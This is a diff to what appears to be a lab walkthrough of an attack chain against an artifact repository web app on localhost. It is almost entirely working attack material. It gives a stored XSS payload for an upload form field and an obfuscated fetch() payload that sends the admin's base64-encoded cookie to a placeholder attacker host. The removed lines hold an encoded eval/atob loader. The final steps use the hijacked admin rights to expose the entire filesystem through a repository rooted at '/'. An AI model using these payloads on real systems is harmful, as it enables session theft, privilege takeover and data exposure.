@@ -11,7 +11,7 @@ So, there is an upload functionality here, (in upload artifact). So, this page a
 
 Lets try giving a simple alert(1) payload to see if we have xss:
 repo id: internal
-group id : <img src=a onerror=alert(1)>
+group id : `<img src=a onerror=alert(1)>`
 artifact: 1
 version: 1
 packaging : 1
@@ -19,6 +19,11 @@ upload a random file: then save.
 Go to http://localhost:8055/repository/internal/ we can see we have xss
 
 Now our goal is to steal the admin cookie and get the admin privileges which has lot more functionalitites like creating a repository.
+To steal admin cookie:
+`<img src=a onerror="fetch(String.fromCharCode(47)+String.fromCharCode(47)+'{my_host}:{my_port}'+String.fromCharCode(47)+btoa(document.cookie))">`
 
-x"><img%20src="x"%20onerror="javascript:eval(atob('aW1wb3J0KCIuL2V4cGxvaXQuanMiKS50aGVuKHM9PntzLnJ1bigibG9jYWxob3N0IjgwNTUiKX0pOw=='))">
-aW1wb3J0KCIuL2V4cGxvaXQuanMiKS50aGVuKHM9PntzLnJ1bigibG9jYWxob3N0IjgwNTUiKX0pOw==
+After getting the admin priveleges: create a new repo
+id=root
+name=root
+directory=/
+Accessed via http://localhost:8055/repository/root/ giving us complete read access to the entire system.
